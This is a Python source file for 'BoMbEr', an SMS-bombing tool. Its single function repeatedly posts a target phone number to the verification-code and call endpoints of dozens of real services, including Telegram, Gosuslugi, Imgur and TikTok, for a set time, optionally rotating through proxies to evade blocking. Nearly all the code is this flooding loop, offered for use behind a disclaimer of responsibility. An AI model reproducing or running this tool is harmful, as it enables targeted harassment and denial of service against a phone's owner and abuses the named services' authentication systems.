 # -*- coding: utf-8 -*-
#!/usr/bin/env python

"""
╔═════════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║                                      BoMbEr                                     ║
║  Author:                                                                        ║
║  https://github.com/ebankoff                                                    ║
║                                                                                 ║
║  The author of this program is not responsible for its use!                     ║
║  When posting this code on other resources, please indicate the author!         ║
║                                                                                 ║
║                               All rights reserved.                              ║
║                           Copyright (C) 2021 ebankoff                           ║
║                                                                                 ║
╚═════════════════════════════════════════════════════════════════════════════════╝
"""

#--------------------------------------(sms)--------------------------------------

import os
import sys
import time
import json
import emoji
import random
import shutil
import socket
import ctypes
import smtplib
import os.path
import asyncio
import requests
import colorama
import datetime
import threading
import user_agent
import progressbar
from time import sleep
from threading import *
from sys import platform
from asyncio import sleep
from getpass import getpass
from os import name, system
from progress.bar import Bar
from threading import Thread
from functools import reduce
from bs4 import BeautifulSoup
from requests import get, post
from selenium import webdriver
from os.path import exists, isfile
from random import choice, randint
from bs4 import BeautifulSoup as bs
from selenium_stealth import stealth
from progress.spinner import Spinner
from selenium.webdriver.common.by import By
from colorama import Fore, Back, Style, init
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import StaleElementReferenceException

colorama.init()

header = {
	"Content-Type": "application/json"
}

def sms(prx, number, tm):
	try:
		if prx == 'yes':
			proxy = []
			t = time.monotonic()

			with open(r"proxies.txt", "r", encoding="utf-8") as file:
				for line in file:
					proxy.append(line)

			proxy = [line.rstrip() for line in proxy]

			while time.monotonic() - t < tm:
				proxies = {'http': 'http://' + random.choice(proxy), 'https': 'http://' + random.choice(proxy)}
				try:
					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
					requests.post(url, json = params, headers = header, proxies = proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.sunlight.net/v3/customers/authorization/", headers = header, json = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {"app_id": "54b5174d2cc1b37a50000001", "phone": "+" + number}
					requests.post("https://api.wheely.com/v6/auth/oauth/token", json = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"action": "set-sms", 
						"phone": "+" + number,
						"password": "qwertY1234_",
						"role": "1",
						"promocode": "",
						"who": "1",
						"g_token": ""
					}
					requests.post("https://tips.yandex/dhdghfier.html", headers = header, json = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {"sender": "Tele2"}
					requests.post(f"https://spb.tele2.ru/api/validation/number/{number}", headers = header, json = payload, proxies = proxies)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android", json=payload, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://api.beget.com/v1/registration/verification", params = {"phone_number:": "+"+number, "request_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzUxMiJ9.eyJpc3MiOiJjYXB0Y2hhLmJlZ2V0LmNvbSIsImlhdCI6MTYzODMxNzQ5NCwiZXhwIjoxNjM4MzE3Njc0LCJqdGkiOiIzNzk2NTAwN2Q1OGRkMjllZTUwNGY5ZDFhOTBjNTA4MiIsImFjdGlvbnMiOlsiXC9iZWdldF9yZWdpc3RyYXRpb25fdjFfcmVnaXN0cmF0aW9uX1JlZ2lzdHJhdGlvblNlcnZpY2VcL3NlbmRWZXJpZmljYXRpb25Db2RlIl19.TKO7gn90NjF9L5b20eYDyl28yYkAwdN2fxLV8f3t3gYWJ0RPH2rNCj0Nsnb4T-DDoWKDorFRapcGNwvoYqNxKNDFEddClt-a1HPapPYuhTqb78uMVGRyKjsgMRdCN2u3PmUXfVKP-XQRGdAxJRGGMzCUuthVs3aOcmE23_wJ6UDyf0c7TaML4HU5S7ov4w4hbFfxe0VomJPZlzin28zlW2Yox-QQffljgmpa81TGH1PuAA0YJTCdO13SDkjDIWYiW0wfrj_yeKVMhlAQ8sf9TXT67brinjuNqiUXsBSGdyKBp26UaV0Tbo403sCpzWGCCubupPcRVVObsuC5bo3Rog"}, headers=header, proxies=proxies)
				except:
					pass

				try:
					payload = {
						"client_id": "broker_otp_guest2",
						"grant_type": "password",
						"username": number
					}
					requests.post("https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token", json=payload, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp?pageName=loginByUserPhoneVerification&fromCheckout=false&fromRegisterPage=true&snLogin=&bpg=&snProviderId=", data={"phone":number, "g-recaptcha-response":"", "recaptcha":"on"}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number9, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://api.iconjob.co/api/auth/verification_code", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=num[0]
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"instanceId": "123",
						"firstName": "Пупкин",
						"lastName": "Василий",
						"contactType": "mobile",
						"contactValue": num2
					}
					requests.post("https://www.gosuslugi.ru/auth-provider/mobile/register", json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://youla.ru/web-api/auth/request_code", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "browser": "undefined"}
					requests.post("https://callmyphone.org/do-call", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "type": "authenticateCode"}
					requests.post("https://api.cian.ru/sms/v1/send-validation-code/", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"phone_number": number, "region_code": "RU"}
					requests.post("https://api.imgur.com/account/v1/phones/verify", headers=header, json=payload, proxies=proxies)
				except:
					pass

				try:
					payload = {"demo_number": "+" + number, "ajax_demo_send": "1"}
					requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", headers=header, data=payload, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://www.eldorado.ru/_ajax/spa/auth/v2/auth_with_login.php", params = {"user_login": number}, headers=header, proxies=proxies)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header, proxies=proxies)
				except:
					pass

				try:
					requests.get(f"https://findclone.ru/register?phone=+{number}", proxies = proxies)
				except:
					pass

				try:			
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://www.flipkart.com/api/5/user/otp/generate', data={'phone': '+' + number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post('https://youla.ru/web-api/auth/request_code', data={"phone": number}, headers=header, proxies = proxies)
				except:
					pass

				try:
					requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number}, proxies = proxies)
				except:
					pass

				try:
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}", headers=header, proxies = proxies)
				except:
					pass

		elif prx == 'no':
			t = time.monotonic()

			while time.monotonic() - t < tm:
				try:
					url = 'https://u.icq.net/api/v48/rapi/auth/sendCode'
					params = {"reqId":"66497-1613742053","params":{"phone": number,"language":"ru-RU","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}}
					requests.post(url, json = params, headers = header)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("https://youla.ru/web-api/auth/request_code", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "browser": "undefined"}
					requests.post("https://callmyphone.org/do-call", headers=header, data=payload)
				except:
					pass

				try:
					payload = {"app_id": "54b5174d2cc1b37a50000001", "phone": "+" + number}
					requests.post("https://api.wheely.com/v6/auth/oauth/token", json = payload)
				except:
					pass

				try:
					requests.post("https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp?pageName=loginByUserPhoneVerification&fromCheckout=false&fromRegisterPage=true&snLogin=&bpg=&snProviderId=", data={"phone":number, "g-recaptcha-response":"", "recaptcha":"on"}, headers=header)
				except:
					pass

				try:
					payload = {
						"phone": number
					}
					requests.post("https://goldapple.ru/rest/V2.1/mobile/auth/send_sms_code?store_id=1&type=android", json=payload)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number9, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
				except:
					pass

				try:
					payload = {
						"action": "set-sms", 
						"phone": "+" + number,
						"password": "qwertY1234_",
						"role": "1",
						"promocode": "",
						"who": "1",
						"g_token": ""
					}
					requests.post("https://tips.yandex/dhdghfier.html", headers = header, json = payload)
				except:
					pass

				try:
					payload = {"sender": "Tele2"}
					requests.post(f"https://spb.tele2.ru/api/validation/number/{number}", headers = header, json = payload)
				except:
					pass

				try:
					requests.post("https://api.iconjob.co/api/auth/verification_code", json={"phone": number}, headers=header)
				except:
					pass

				try:
					payload = {
						"country_code": "RU",
						"phone": number
					}
					requests.post("https://goldapple.ru/rest/V2.0/customer/registration/start", headers = header, json = payload)
				except:
					pass

				try:
					payload = {"phone": "+" + number, "type": "authenticateCode"}
					requests.post("https://api.cian.ru/sms/v1/send-validation-code/", headers=header, json=payload)
				except:
					pass

				try:
					num = number
					num2=""
					num2+="+"
					num2+=num[0]
					num2+="("
					num2+=num[1]
					num2+=num[2]
					num2+=num[3]
					num2+=")"
					num2+=num[4]
					num2+=num[5]
					num2+=num[6]
					num2+=num[7]
					num2+=num[8]
					num2+=num[9]
					num2+=num[10]
					payload = {
						"instanceId": "123",
						"firstName": "Пупкин",
						"lastName": "Василий",
						"contactType": "mobile",
						"contactValue": num2
					}
					requests.post("https://www.gosuslugi.ru/auth-provider/mobile/register", json=payload)
				except:
					pass

				try:
					payload = {"phone_number": number, "region_code": "RU"}
					requests.post("https://api.imgur.com/account/v1/phones/verify", headers=header, json=payload)
				except:
					pass

				try:
					payload = {"demo_number": "+" + number, "ajax_demo_send": "1"}
					requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php", headers=header, data=payload)
				except:
					pass

				try:
					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": "7", "Mobile": number, "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
				except:
					pass

				try:
					requests.get(f"https://findclone.ru/register?phone=+{number}")
				except:
					pass

				try:
					payload = {
						"client_id": "broker_otp_guest2",
						"grant_type": "password",
						"username": number
					}
					requests.post("https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token", json=payload)
				except:
					pass

				try:
					payload = {"phone": number}
					requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode", headers=header, data=payload)
				except:
					pass

				try:			
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}/", headers=header)
				except:
					pass

				try:
					requests.post("https://my.telegram.org/auth/send_password", data = {'phone': number})
				except:
					pass

				try:
					requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{number}")
				except:
					pass

		else:
			pass

	except:
		pass